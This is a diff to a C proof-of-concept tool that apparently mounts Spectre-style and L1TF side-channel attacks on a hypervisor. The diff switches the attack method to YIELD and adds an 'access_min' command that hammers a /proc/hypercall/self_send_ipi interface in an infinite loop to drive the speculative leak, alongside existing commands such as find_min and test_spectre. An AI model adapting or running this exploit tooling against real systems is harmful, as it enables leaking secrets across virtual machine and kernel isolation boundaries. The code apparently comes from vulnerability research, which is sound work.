@@ -63,7 +63,7 @@ enum half_spectre_method {
   METHOD_IPI,
   METHOD_YIELD,
 };
-static const enum half_spectre_method method = METHOD_IPI;
+static const enum half_spectre_method method = METHOD_YIELD;
 
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
   unsigned int cpu = 0;
@@ -225,6 +225,38 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   printf("Mins\n\tMiss: %ld\tHit: %ld\tHit?: %s\n", miss, hit, hit < CACHE_HIT_THRESHOLD ? "YES!" : "no");
 }
 
+void cmd_access_min(int argc, char *argv[argc]) {
+  if (argc <= 2) {
+    errno = EINVAL;
+    err(EXIT_FAILURE, "missing min");
+  }
+
+  char *endptr = NULL;
+  uintptr_t min = strtoull(argv[2], &endptr, 16);
+  if (endptr == argv[2]) {
+    errno = EINVAL;
+    err(EXIT_FAILURE, "Could not parse min");
+  }
+
+  struct self_send_ipi_hypercall opts = {.min = min};
+
+  const char *hypercall_path = "/proc/hypercall/self_send_ipi";
+  printf("Writing to '%s' in an infinte loop...\n", hypercall_path);
+  int fd = open(hypercall_path, O_WRONLY);
+  if (fd < 0) {
+    err(fd, "Failed to open %s", hypercall_path);
+  }
+
+  while (1) {
+    int b = write(fd, &opts, sizeof(opts));
+    if (b < 0) {
+      err(errno, "Failed to write to %s", hypercall_path);
+    }
+  }
+
+  close(fd);
+}
+
 void pin_cpu(void) {
   unsigned int cpu = 0;
   if (getcpu(&cpu, NULL) == -1) {
@@ -258,6 +290,8 @@ int main(int argc, char *argv[argc]) {
     cmd_calc_min(argc, argv);
   } else if (!strcmp(argv[1], "test_spectre")) {
     cmd_test_spectre(argc, argv, leak_page);
+  } else if (!strcmp(argv[1], "access_min")) {
+    cmd_access_min(argc, argv);
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
@@ -274,7 +308,8 @@ int main(int argc, char *argv[argc]) {
   } else if (!strcmp(argv[1], "l1tf")) {
     return l1tf_main(argc - 1, &argv[1]);
   } else {
-    warnx("Unknown command!");
+    warnx("Unknown command! Supported commands "
+          "are\n\tdetermine\n\tcalc_min\n\ttest_specte\n\taccess_min\n\tfind_min\n\tapic\n\tl1tf");
   }
 
   munmap(leak_page, PAGE_SIZE);
